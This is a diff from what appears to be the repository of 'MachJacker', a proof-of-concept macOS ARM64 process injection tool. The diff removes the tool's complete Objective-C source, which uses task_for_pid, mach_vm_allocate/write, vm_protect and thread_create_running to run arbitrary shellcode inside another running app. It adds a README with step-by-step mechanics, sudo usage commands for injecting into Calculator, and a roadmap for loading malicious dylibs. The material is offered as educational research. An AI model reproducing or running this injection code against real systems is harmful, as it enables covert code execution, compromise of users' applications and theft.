@@ -1,194 +1,57 @@
-#import <Foundation/Foundation.h>
-#import <AppKit/AppKit.h>
-#include <mach/mach_vm.h>
-#include <sys/sysctl.h>
-#include <string.h>
+# **MachJacker 🏴‍☠️**
 
-#define STACK_SIZE 0x1000
-#define MAX_SHELLCODE_SIZE 4096
+**A modern process injection tool for macOS (ARM64 / Apple Silicon)**
 
-// Function to extract bundle ID from app bundle
-NSString* getBundleIdentifier(NSString* appPath) {
-    NSString* infoPlistPath = [appPath stringByAppendingPathComponent:@"Contents/Info.plist"];
-    NSDictionary* infoPlist = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
-    
-    if (!infoPlist) {
-        printf("[-] Failed to read Info.plist from %s\n", [appPath UTF8String]);
-        exit(-1);
-    }
-    
-    NSString* bundleId = [infoPlist objectForKey:@"CFBundleIdentifier"];
-    if (!bundleId) {
-        printf("[-] No bundle identifier found in Info.plist\n");
-        exit(-1);
-    }
-    
-    printf("[+] Found bundle identifier: %s\n", [bundleId UTF8String]);
-    return bundleId;
-}
+MachJacker is a proof-of-concept utility that leverages the Mach kernel API to inject and execute code within the memory space of other running applications on Apple Silicon Macs. It serves as an educational tool for exploring the low-level mechanics of macOS process manipulation.
 
-// Function to read shellcode from file
-NSData* readShellcodeFromFile(NSString* filePath) {
-    NSData* shellcodeData = [NSData dataWithContentsOfFile:filePath];
-    
-    if (!shellcodeData) {
-        printf("[-] Failed to read shellcode file: %s\n", [filePath UTF8String]);
-        exit(-1);
-    }
-    
-    if ([shellcodeData length] > MAX_SHELLCODE_SIZE) {
-        printf("[-] Shellcode file too large (max %d bytes)\n", MAX_SHELLCODE_SIZE);
-        exit(-1);
-    }
-    
-    printf("[+] Read shellcode from file: %s (%lu bytes)\n", [filePath UTF8String], (unsigned long)[shellcodeData length]);
-    return shellcodeData;
-}
+## **How It Works**
 
-pid_t get_pid(NSString* bundle_id) {
-    pid_t pid = 0;
-    // Find applications with bundle ID
-    NSArray *runningApplications = [NSRunningApplication runningApplicationsWithBundleIdentifier:bundle_id];
-    // Check if any found at all
-    if (runningApplications.count > 0) {
-        for (id app in runningApplications) {
-            pid = [app processIdentifier];   
-            return pid;
-        }
-    }
-    // If we got here, it means that we didn't find an instance
-    printf("[-] There is no instance of the application running as user, exiting...\n");
-    exit(-1);
-}
+MachJacker performs a classic form of process injection by directly manipulating the target process at the kernel level. This method bypasses many higher-level security controls.
 
-void printUsage(const char* programName) {
-    printf("Usage: %s <app_path> <shellcode_file>\n", programName);
-    printf("  app_path:        Path to the target application bundle (e.g., /Applications/Slack.app)\n");
-    printf("  shellcode_file:  Path to the file containing shellcode\n");
-    printf("\nExample: %s /Applications/Slack.app ./shellcode.bin\n", programName);
-    printf("\nNote: This exploit requires root privileges to get task ports\n");
-}
+The injection process follows these steps:
 
-int main(int argc, const char * argv[]) {
-    // Check command line arguments
-    if (argc != 3) {
-        printUsage(argv[0]);
-        return -1;
-    }
-    
-    NSString* appPath = [NSString stringWithUTF8String:argv[1]];
-    NSString* shellcodePath = [NSString stringWithUTF8String:argv[2]];
-    
-    printf("[+] Generic Mach-O Injection Exploit\n");
-    printf("[+] Target app: %s\n", [appPath UTF8String]);
-    printf("[+] Shellcode file: %s\n", [shellcodePath UTF8String]);
-    
-    // Check if app bundle exists
-    BOOL isDirectory;
-    if (![[NSFileManager defaultManager] fileExistsAtPath:appPath isDirectory:&isDirectory] || !isDirectory) {
-        printf("[-] App bundle does not exist or is not a directory: %s\n", [appPath UTF8String]);
-        return -1;
-    }
-    
-    // Extract bundle identifier
-    NSString* bundleId = getBundleIdentifier(appPath);
-    
-    // Read shellcode from file
-    NSData* shellcodeData = readShellcodeFromFile(shellcodePath);
-    const char* shellcode = [shellcodeData bytes];
-    size_t shellcodeSize = [shellcodeData length];
-    
-    // Get process ID
-    pid_t pid = get_pid(bundleId);
-    printf("[+] Found running process with PID: %d\n", pid);
+1. **Target Identification**: The tool first inspects the target application's Info.plist to retrieve its **Bundle Identifier**. It then queries the system for a running process matching that identifier to get its **Process ID (PID)**.  
+2. **Acquire Task Port**: It calls task\_for\_pid() to request a handle (a "task port") for the target process from the Mach kernel. This is the key that unlocks control over the target. **This step requires root privileges.**  
+3. **Allocate Memory**: Using the acquired task port, it calls mach\_vm\_allocate() to reserve two regions of memory inside the target process: one for the shellcode to be executed, and another to serve as a stack for the new thread.  
+4. **Write and Protect**: The shellcode is written into the allocated memory region using mach\_vm\_write(). The memory permissions are then adjusted with vm\_protect(): the code region is marked as **Readable \+ Executable**, and the stack region is marked as **Readable \+ Writable**.  
+5. **Create and Execute Thread**: Finally, thread\_create\_running() is called to create and immediately start a new thread within the target process. The thread's initial state is configured so that its instruction pointer points directly at the start of the injected shellcode, beginning its execution.
 
-    // Get task port
-    task_t remoteTask;
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-          
-    if (kr != KERN_SUCCESS) {
-        printf("[-] Failed to get task port for pid:%d, error: %s\n", pid, mach_error_string(kr));
-        printf("[-] Note: This exploit requires root privileges\n");
-        return(-1);
-    } else {
-        printf("[+] Got access to the task port of process: %d\n", pid);
-    }
-    
-    // Allocate memory for stack and code
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+## **Usage**
 
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+MachJacker must be compiled and run from the command line with root privileges.
 
-    if (kr != KERN_SUCCESS) {
-        printf("[-] Failed to allocate stack memory in remote thread, error: %s\n", mach_error_string(kr));
-        exit(-1);
-    } else {
-        printf("[+] Allocated remote stack: 0x%llx\n", remoteStack64);
-    }
+\# Compile the tool  
+clang \-o machjacker \-framework Foundation \-framework AppKit machjacker.m
 
-    kr = mach_vm_allocate(remoteTask, &remoteCode64, shellcodeSize, VM_FLAGS_ANYWHERE);
+\# Run with sudo  
+sudo ./machjacker \<path\_to\_app\> \<path\_to\_shellcode\>
 
-    if (kr != KERN_SUCCESS) {
-        printf("[-] Failed to allocate code memory in remote thread, error: %s\n", mach_error_string(kr));
-        exit(-1);
-    } else {
-        printf("[+] Allocated remote code placeholder: 0x%llx\n", remoteCode64);
-    }
-    
-    // Write shellcode to remote process
-    kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t) shellcode, shellcodeSize);
+**Example:** Injecting a payload into the running Calculator app.
 
-    if (kr != KERN_SUCCESS) {
-        printf("[-] Failed to write into remote thread memory, error: %s\n", mach_error_string(kr));
-        exit(-1);
-    }
-    
-    // Set memory permissions for code (readable and executable)
-    kr = vm_protect(remoteTask, remoteCode64, shellcodeSize, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+\# Assume shellcode.bin contains a simple payload (e.g., spawns a shell)  
+sudo ./machjacker /System/Applications/Calculator.app ./shellcode.bin
 
-    if (kr != KERN_SUCCESS) {
-        printf("[!] Failed to give injected code memory proper permissions, error: %s\n", mach_error_string(kr));
-        exit(-1);
-    }
+## **🗺️ Roadmap**
 
-    // Set memory permissions for stack (readable and writable)
-    kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+This tool is currently in its early stages. The primary goal is to evolve it from a simple shellcode injector into a more versatile and powerful dynamic library injector.
 
-    if (kr != KERN_SUCCESS) {
-        printf("[!] Failed to give stack memory proper permissions, error: %s\n", mach_error_string(kr));
-        exit(-1);
-    }
+* \[x\] **Core Shellcode Injection (ARM64)**  
+  * Successfully inject and run raw shellcode in a remote process.  
+  * Robust error handling and logging.  
+* \[ \] **Dynamic Library (.dylib) Injection**  
+  * **Phase 1: Research & Scaffolding**  
+    * Implement logic to find the base address of libdyld.dylib in the remote process.  
+    * Implement a function to find the address of the exported dlopen symbol within the remote process's instance of libdyld.dylib.  
+  * **Phase 2: Payload Construction**  
+    * Modify the injection logic to write the path of the .dylib to be injected into the target process's memory.  
+    * Instead of custom shellcode, create a small "stub" shellcode that sets up the correct arguments (the dylib path) in the appropriate registers (x0, x1, etc.) and then calls the address of dlopen.  
+  * **Phase 3: Implementation & Testing**  
+    * Update the main function to accept a .dylib path instead of a shellcode file.  
+    * Use the thread creation technique (thread\_create\_running) to execute the dlopen stub, effectively forcing the target process to load the malicious library.  
+* \[ \] **Flexible Target Selection**  
+  * Add command-line flags to target processes by PID (-p \<pid\>) or process name (-n \<name\>) in addition to the app bundle path.
 
-    // Set up thread state
-    struct arm_unified_thread_state remoteThreadState64;
+## **Disclaimer**
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+This tool is intended for **educational and research purposes only**. Running arbitrary code inside other processes can cause system instability and security vulnerabilities. Do not use this tool on systems you do not own or have explicit permission to test.
 
-    // Shift stack to middle of allocated region
-    remoteStack64 += (STACK_SIZE / 2);
-
-    // Set remote instruction pointer to our shellcode
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-
-    // Set remote stack pointer
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
-
-    printf("[+] Remote Stack 64: 0x%llx, Remote code: 0x%llx\n", remoteStack64, remoteCode64);
-
-    // Create and start remote thread
-    thread_act_t remoteThread;
-
-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
-
-    if (kr != KERN_SUCCESS) {
-        printf("[-] Exploit failed: error: %s\n", mach_error_string(kr));
-        return (-1);
-    }
-    
-    printf("[+] Exploit succeeded! Injected shellcode into process %d\n", pid);
-    printf("[+] Shellcode execution started in remote thread\n");
-    return 0;
-}
